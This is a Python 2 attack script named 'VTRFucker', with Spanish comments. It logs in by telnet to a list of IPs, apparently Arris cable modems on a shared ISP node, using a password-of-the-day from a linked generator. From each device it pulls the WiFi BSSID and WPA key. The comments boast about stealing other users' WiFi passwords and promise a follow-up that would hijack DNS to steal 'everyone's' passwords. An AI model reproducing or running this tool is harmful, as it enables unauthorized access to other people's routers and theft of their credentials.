#!Python: VTRFucker- Getter(solo retorna datos, pronto el Setter c: )
# escanea tu nodo, agrega las ip, espera unos segundos y obten tus claves wifi :)
# Setter?, escanea el nodo, agrega las ip, setea el DNS, y roba las contrasenas de todos!!!
# Saludos lulz!
import telnetlib
import getpass
import sys
import time
import re
from threading import Thread
def get1(ip):
	print 'ip ' + ip
	try:
		tn=telnetlib.Telnet(ip, port, timeout)
		time.sleep(1)
		tn.write(password + "\n")
		time.sleep(1)
		tn.write("gw\n")
		time.sleep(1)
		tn.write("get\n")
		time.sleep(1)
		tn.write("quit\n")
		output=tn.read_all()
		output=str(output)
		for line in output.splitlines():
  			if 'wifiBssid[0]' in line:
				wifibssid=line.split()
			if 'wifiWpapsk[0]' in line:
				wifipass=line.split()
   		print "[+]----"+ip+"---[+]"
   		print wifibssid
   		print wifipass
   		print"[-]-------------------[-]"
	except Exception, e:
		print"[-] Error: ", e, "- Host: ", ip
		exit(0)
	time.sleep(1)
print '[*]----------------------------[*]\n'
print	'[!] VTRFucker - Telnet module\n'
print '[*]----------------------------[*]'
port=23
timeout=5
a=1
inputIP=""
while a==1:
	inputIP=inputIP+raw_input("Ingrese IPs, separadas por comas: ")
	askIP=raw_input("ingresar mas? (n or y): ")
	if askIP=="y":
		a=1
	elif askIP=="n":
		a=a-1
	else:
		print "[-] Error: solo ingresar 'y' o 'n'"
		exit(0)
inputIP=re.split(',', inputIP)
inputIP=list(set(inputIP))
print "Total de IPs a escanear: ", len(inputIP),"\nIPs: ", inputIP
print "\nGive me the password !! \n(if u don't know, please visit: \nhttp://www.borfast.com/projects/arris-password-of-the-day-generator/generator)\n"
password=getpass.getpass()
for ip in inputIP:
	thread = Thread(target = get1, args = (ip, ))
	thread.start()
	time.sleep(1)
print 'end'